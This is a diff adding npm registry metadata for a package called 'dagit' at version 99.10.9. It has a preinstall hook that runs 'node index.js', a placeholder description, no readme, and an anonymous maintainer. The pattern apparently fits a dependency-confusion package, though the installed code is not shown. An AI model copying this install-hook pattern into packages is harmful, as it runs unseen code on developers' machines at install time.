@@ -1,0 +1,62 @@
+{
+    "_id": "dagit",
+    "name": "dagit",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "dagit",
+            "version": "99.10.9",
+            "description": "difbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "dagit@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-gwh87IdNuK8rGAu+710au8+y296z0mRN8F7eJJLzqJG39mtRs4omIUGO+bCNuxU9eOwn9u3+5BjvEOy90XhKWg==",
+                "shasum": "a795e5ea15f6781c79c9e064ea6284613574a530",
+                "tarball": "https://registry.npmjs.org/dagit/-/dagit-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 6704,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQwucACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmolfg/+IZtzTPPcprUTrOtxVMyTgo5Zp/6VDaSQlqJ4BkKsqgWsnwxX\r\nSFMgYTE7iCJAMeX/ci2T/IzWOquvJ2No7FGEWHfDC8xNYymWf7m1acHZiLzZ\r\n77JYJu3uMy15J9ZpvAQ7PukndXEN7rq5iwEV05TT/5Gi9cTSmb6TUBrVWypR\r\nmuDBJ9f5W4cDJkPqWwHn3GAoQSGK3xXG9iK7PlJyygJNNJyzSuy4wAmXXoXc\r\n0+NaOE2TdWE6expUzj58B8XMekmzE9F92KvlL2X70KBx/G8YOSExwXpqPF91\r\n0yhcJC9KbztkIZQ8FwcoW9x3urzz10r4KhderoJblUU6XZk45HeEbjaENsuR\r\nHjCxBXGzGKG3J4T9geT1HMGTIx4vwC/OSW8eZdKr1Fzpoe+9qe4VWe5DRUDx\r\nIlpqh0Us1ap0RZSAZR/WlCCu3mCMrYaxXxnEAsAN9oB4AeA7XRRan5XeqLru\r\nFHDJHmJ2/YKCyg8954/JqFk8FgRu94p/eg6AfzK9EPsldRF7r3GLrhGQb0O3\r\nHFuuxJ9XfPdkM2DgS9cvLYh1GQZoTylog31SWblDlVMhfAS35Qn/iDokl9yK\r\nDpFDO8U2Fl3sucF4rNfu3DJbGqZbCrCcrBjLjnbyuctIXuuhC/aduBY2OU6O\r\ncAab5bXAK9Ye9PBo0N4qyqE9P2oEaXAdLas=\r\n=NVcj\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "r0xkkar1",
+                "email": "r0xkkar1@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "r0xkkar1",
+                    "email": "r0xkkar1@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/dagit_99.10.9_1648561052629_0.17306834034307528"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-29T13:37:32.628Z",
+        "99.10.9": "2022-03-29T13:37:32.794Z",
+        "modified": "2022-03-29T13:37:32.956Z"
+    },
+    "maintainers": [
+        {
+            "name": "r0xkkar1",
+            "email": "r0xkkar1@33mail.ga"
+        }
+    ],
+    "description": "difbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
